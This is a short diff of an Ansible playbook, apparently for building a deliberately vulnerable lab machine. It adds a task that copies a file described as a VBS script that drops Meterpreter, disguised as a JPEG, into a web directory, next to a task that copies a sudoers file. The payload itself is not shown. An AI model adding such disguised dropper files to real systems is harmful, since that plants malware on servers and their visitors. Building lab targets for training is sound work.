@@ -54,6 +54,14 @@
     group: www-data
     mode: 0644
 
+- name: Let's copy vbs script file that drops meterpreter
+  copy:
+    src: files/10007.jpg
+    dest: /var/www/html/a/b/allp/10007.jpg
+    owner: www-data
+    group: www-data
+    mdoe: 0644
+
 - name: Copy sudoers file over
   copy:
     src: files/sudoers
